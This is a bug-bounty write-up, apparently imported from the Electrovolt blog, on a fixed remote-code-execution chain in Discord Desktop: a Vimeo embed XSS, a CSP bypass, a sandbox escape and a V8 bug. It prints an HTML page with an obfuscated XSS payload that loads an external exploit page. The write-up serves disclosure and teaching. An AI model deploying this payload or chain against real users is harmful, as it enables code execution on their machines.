---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-07-29_discord-desktop-remote-code-execution.md
original_filename: 2022-07-29_discord-desktop-remote-code-execution.md
title: Discord Desktop - Remote Code Execution
category: documents
detected_topics:
- xss
- command-injection
- path-traversal
- mfa
- api-security
tags:
- imported
- documents
- xss
- command-injection
- path-traversal
- mfa
- api-security
language: en
raw_sha256: c7e39a6d725eab61a0cbac4ea004324e776f90d3087a07abe0d3de8be05c702b
text_sha256: 4708934a8fdc3bdda4f07f2d8b5f17783af9cf1773ffb1c8871310937b768c7b
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# Discord Desktop - Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-07-29_discord-desktop-remote-code-execution.md
- Source Type: markdown
- Detected Topics: xss, command-injection, path-traversal, mfa, api-security
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `c7e39a6d725eab61a0cbac4ea004324e776f90d3087a07abe0d3de8be05c702b`
- Text SHA256: `4708934a8fdc3bdda4f07f2d8b5f17783af9cf1773ffb1c8871310937b768c7b`


## Content

---
title: "Discord Desktop - Remote Code Execution"
page_title: "Discord Desktop - Remote Code Execution | Electrovolt Blog"
url: "https://blog.electrovolt.io/posts/discord-rce/"
final_url: "https://blog.electrovolt.io/posts/discord-rce/"
authors: ["s1r1us (@s1r1u5_)", "ptr-yudai (@ptrYudai)"]
programs: ["Discord"]
bugs: ["RCE", "XSS", "Sandbox bypass", "CSP bypass"]
bounty: "5,000"
publication_date: "2022-07-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2381
---

#  Discord Desktop - Remote Code Execution 

2022-07-29

| [Home](/)

– by [s1r1us](https://twitter.com/S1r1u5_), the bug reported on: July 10th 2021

### Prologue

#### How Electrovolt Started?

During our prototype pollution [research](https://blog.s1r1us.ninja/research/PP), [BlackFan](https://twitter.com/black2fan) reported an XSS to an BBP. The XSS report wasn’t getting much attention and was still in triaged state from two months with no response. The program scope had a desktop application as well, which made me curious If I could exploit this to get RCE on the desktop app. However, the desktop app is not Electron based regardless, I was still able to get an RCE with [ptrYudai’s](https://twitter.com/ptrYudai) help. The program noticed our escalation to RCE and immediately fixed & paid out with a nice bounty. With such a result, I opted to start hacking Desktop Applications.

### Discord RCE

Obviously, I decided to pwn the Discord Desktop Application because it was being used for our Prototype Pollution research collabaration. Discord uses ElectronJS for their Desktop Application and to be honest I didn’t really know much about ElectronJS at that time but I thought it is just an JavaScript Application and started learning and hacking. The interesting thing about ElectronJS Applications are you can extract the JavaScript used to build the application using the below command. The one thing I always love to do is source code auditing, it makes things easier unlike BlackBox testing. When it comes to Javascript hacking, most of the time you can get the source code either it is a Web Application Frontend or JS based Desktop Applications.
  
  
  1npx asar extract /Applications/Discord.app/Contents/Resources/app.asar  ./
  

After extracting, I realized that it is not easy to achieve Remote Code Execution using usual Electron misconfiguration because as we can see that the `nodeIntegration` is disabled and `contextIsolation` is enabled. [Masato](https://twitter.com/kinugawamasato) pwned the Discord when `contextIsolation` is disabled, you can read more details about it in his [blog](https://mksben.l0.cm/2020/10/discord-desktop-rce.html) which also a very good starter to work on ElectronJS applications.
  
  
  1 const mainWindowOptions = {
  2  title: 'Discord',
  3  webPreferences: {
  4  blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
  5  nodeIntegration: false,
  6  preload: _path.default.join(__dirname, 'mainScreenPreload.js'),
  7  nativeWindowOpen: true,
  8  enableRemoteModule: false,
  9  spellcheck: true,
  10  contextIsolation: true,
  11  }
  12  };
  

So far,`webPreferences` looks good as far as the previous [RCE](https://github.com/doyensec/awesome-electronjs-hacking)’s on Electron Applications concerned. But still there is one import `webPreference` is missing which is `sandbox` flag. If the `sandbox` is not set to true, by default the App runs without sandbox. And I checked the Electron version which is `9-x-y` using relatively old Chromium `Chrome/83.0.4103.122`. It become apparent that it is not really hard to get RCE with that version of chrome because there are quite a few v8 bugs available in the Chromium patches.

### XSS

I decided to find XSS on Discord Desktop, as the Discord frontend uses ReactJS after few days I realized that finding XSS on the main Discord App was hard and even there were no interesting ReactJS sinks as far as I can see. Taking motivation from Masato’s blog, I started looking for XSS on Discord Embeds.

### Vimeo XSS

While I am trying to find an XSS on the embeds of the Discord, I worked with Harsh Jaiswal to find an XSS in Discord embeds. After a bit of work, We managed get an XSS on one of the Vimeo endpoints. However, Due to Vimeo’s CSP implementation, I had difficulties executing an external script to trigger the exploit. I had faced a little issue while loading an external script and run the exploit because of the CSP. Vimeo endpoint has the following CSP.
  
  
  1Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'
  

Funny enough, as the Discord Chrome version is old I decided to use a CSP [bypass](https://bugs.chromium.org/p/chromium/issues/detail?id=1115045) which I read before on crbug.com to load an external iframe in the vimeo by bypassing the `frame-src`.

By hosting a following HTML and pasting the link in the Discord Chat pops an alert box in the vimeo embed.
  
  
  1<!DOCTYPE html>
  2<html>
  3<head>
  4  <meta charset="utf-8">
  5  <meta property="og:title" content="RCE DEMO">
  6  <meta property="og:description" content="asdasdf<b>Description</b&lt;>">
  7  <meta property="og:type" content="video">
  8  <meta property="og:image" content="https://pbs.twimg.com/profile_images/1313475569426857988/Q0I0VkmF_400x400.jpg">
  9  <meta property="og:image:type" content="image/jpg">
  10  <meta property="og:image:width" content="1280">
  11  <meta property="og:image:height" content="720">
  12  <meta property="og:video:url" content="https://redacted/redacted?redacted=x&redacted=javascript://asd.com?f=1%27%250awindow.open(atob(location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(5).replace(location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(0,5),String.fromCharCode(0x2b)).replace(location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(0,5),String.fromCharCode(0x2b))),location.search.split(String.fromCharCode(0x26))[2].split(String.fromCharCode(0x3d))[1].substr(0,5))//&payload=_selfamF2YXNjcmlwdDonPGlmcmFtZSBzcmNkb2M9IjxpZnJhbWUgc3JjPVwnaHR0cHM6Ly9jdGYuczFyMXVzLm5pbmphL2Rpc2NvcmQvZXhwLmh0bWxcJzs_selfPC9pZnJhbWU_selfIj4n">
  13  <meta property="og:video:type" content="text/html">
  14  <meta property="og:video:width" content="1280">
  15  <meta property="og:video:height" content="720">
  16</head>
  17<body>
  18test
  19</body>
  20</html>
  

### Sandbox Bypass By Escaping to Main Window

I was so excited to run the v8 exploit in the vimeo embed and pop the calculator, but there is a catch. I realized that all the iframes in the Discord Desktop Application are running in sandbox mode, apparently by default Electron enables sandbox in all of the embeds. I thought it is the end of the story.

While I am rambling about this issue in the Discord channel, Masato told me that it was possible to open a new window due to insufficient `new-window` event restriction by the Discord.

![masato 1: masato](/img/masato.png)

But sadly, even after opening the exploit in new window the sandbox is still enabled. I don’t know why, but after sometime I realized that by making a redirect to different origin the sandbox is cleared. It was maybe the renderer process of vimeo embed is reused for the new window created and after the redirect a new process without sandbox might’ve created.

### V8 Exploit

At that time, I am not really good at writing v8 exploits. So, I took my CTF mate ptrYudai’s help to write a v8 exploit using the [crbug.com/1196683](https://chromium-review.googlesource.com/c/v8/v8/+/2820971). And finally the calculator was popped after few trail and errors.

### PoC

Here is the nice PoC which pop the calculator. 

### Fix

Discord upgraded their Electron version to the latest and fixed the `new-window` event handler misconfiguration by not allowing external sites to be loaded in the new window.

“Want to secure your electron or JS Application. Reach out us at [hello@electrovolt.io](mailto:hello@electrovolt.io) or visit <https://electrovolt.io> to learn more”
